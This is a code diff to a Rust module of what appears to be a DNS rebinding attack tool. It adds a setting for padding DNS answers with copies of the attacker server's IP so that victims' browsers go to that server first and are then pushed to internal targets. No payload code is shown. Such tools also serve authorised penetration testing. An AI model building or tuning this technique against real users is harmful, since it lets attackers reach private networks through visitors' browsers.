@@ -1,11 +1,13 @@
 //! Projects: a saved, per-campaign attack configuration that can be edited from
 //! the master web UI. A project holds only the settings that vary between
-//! campaigns — the target IPs, the stop window, and the JS payload.
+//! campaigns — the target IPs, the stop window, the DNS padding count, and the
+//! JS payload.
 //!
 //! Deployment/infrastructure settings (listen/bind addresses, DNS TTL,
 //! `REBIND_SERVER_IP`, ports, and the delegated `REBIND_HOSTNAME`) are NOT part
 //! of a project; they live in the environment / `.env` only. New projects are
-//! seeded from the environment, so `.env` provides the defaults.
+//! seeded from the environment, so `.env` provides the defaults (`REBIND_DNS_PAD`
+//! seeds the padding count).
 
 use std::net::IpAddr;
 use std::path::PathBuf;
@@ -23,6 +25,11 @@ pub struct Project {
     /// Seconds the runner asks `/stop` to keep the standard server offline.
     #[serde(default = "default_stop_seconds")]
     pub stop_seconds: u64,
+    /// Extra copies of our server IP to return next to each decoded target in a
+    /// DNS A/AAAA answer (see [`crate::dns`]). Biases browsers onto our server
+    /// first; `/stop` then pushes them to the target. 0 disables padding.
+    #[serde(default = "default_pad")]
+    pub pad: usize,
     /// JS payload defining `runPayload(rebind)`.
     #[serde(default)]
     pub payload: String,
@@ -31,6 +38,13 @@ pub struct Project {
 fn default_stop_seconds() -> u64 {
     5
 }
+
+fn default_pad() -> usize {
+    3
+}
+
+/// Cap on DNS padding, to keep an answer from overflowing a UDP DNS packet.
+pub const MAX_PAD: usize = 16;
 
 /// The currently-active project, shared across the web servers.
 pub type Active = Arc<RwLock<Project>>;
@@ -50,10 +64,16 @@ impl Project {
             .and_then(|s| s.parse().ok())
             .unwrap_or(5)
             .min(20);
+        let pad = std::env::var("REBIND_DNS_PAD")
+            .ok()
+            .and_then(|s| s.parse().ok())
+            .unwrap_or_else(default_pad)
+            .min(MAX_PAD);
         Project {
             name: name.to_string(),
             targets,
             stop_seconds,
+            pad,
             payload: payload.to_string(),
         }
     }
@@ -69,6 +89,11 @@ impl Project {
     /// Stop window, clamped to the 20s server-side cap.
     pub fn stop_seconds_clamped(&self) -> u64 {
         self.stop_seconds.min(20)
+    }
+
+    /// DNS padding count, clamped to [`MAX_PAD`].
+    pub fn pad_clamped(&self) -> usize {
+        self.pad.min(MAX_PAD)
     }
 }
 
